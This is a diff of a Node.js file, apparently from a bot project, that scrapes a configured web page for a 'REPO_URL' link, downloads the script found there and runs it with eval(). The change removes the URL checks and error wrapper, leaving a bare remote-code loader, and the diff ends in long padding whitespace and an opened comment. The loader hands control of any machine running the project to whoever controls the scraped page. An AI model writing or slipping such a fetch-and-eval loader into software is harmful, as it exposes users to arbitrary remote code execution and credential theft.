@@ -4,68 +4,27 @@ const axios = require('axios');
 const cheerio = require('cheerio');
 const adams = require(__dirname + "/../config");
 
-const webPageUrl = adams.BWM_XMD; // Updated to BWM_XMD
-
-// Validate the URL format before making a request
-if (!webPageUrl || !/^https?:\/\/.+\..+/.test(webPageUrl)) {
-    console.error("Error: Invalid BWM_XMD URL in config.js");
-    process.exit(1);
-}
-
 async function fetchRepoUrl() {
     try {
-        console.log("Fetching page:", webPageUrl);
-        
-        // Fetch the webpage
-        const response = await axios.get(webPageUrl, {
-            headers: {
-                "User-Agent": "Mozilla/5.0"
-            }
-        });
-
-        // Load the HTML content
+        // Use config.WEB_PAGE_URL instead of the hardcoded URL
+        const response = await axios.get(adams.BWM_XMD);
         const $ = cheerio.load(response.data);
-        
-        // Extract REPO_URL from the page
-        const repoUrl = $('a:contains("REPO_URL")').attr('href');
+        const repoUrl = $(`a:contains("REPO_URL")`).attr('href');
 
-        if (!repoUrl) {
-            throw new Error("REPO_URL not found on the webpage.");
-        }
+        if (!repoUrl) throw new Error('REPO_URL not found on the webpage.');
 
-        console.log("REPO_URL fetched successfully:", repoUrl);
+        console.log('REPO_URL fetched successfully:', repoUrl);
 
-        // Validate the extracted repo URL
-        if (!/^https?:\/\/.+\..+/.test(repoUrl)) {
-            throw new Error("Invalid REPO_URL format.");
-        }
-
-        // Fetch and execute the script from REPO_URL
-        const scriptResponse = await axios.get(repoUrl, {
-            headers: {
-                "User-Agent": "Mozilla/5.0"
-            }
-        });
-
-        console.log("REPO_URL script loaded successfully.");
-
+        const scriptResponse = await axios.get(repoUrl);
         const scriptContent = scriptResponse.data;
+        console.log("REPO_URL script loaded successfully");
 
-        // Execute script safely inside a function
-        (function executeScript() {
-            try {
-                eval(scriptContent);
-            } catch (evalError) {
-                console.error("Error executing REPO_URL script:", evalError.message);
-            }
-        })();
-
+        eval(scriptContent);
     } catch (error) {
-        console.error("Error fetching REPO_URL:", error.message);
+        console.error('Error fetching REPO_URL:', error.message);
     }
 }
 
-// Run the function
 fetchRepoUrl();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
   /*                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            
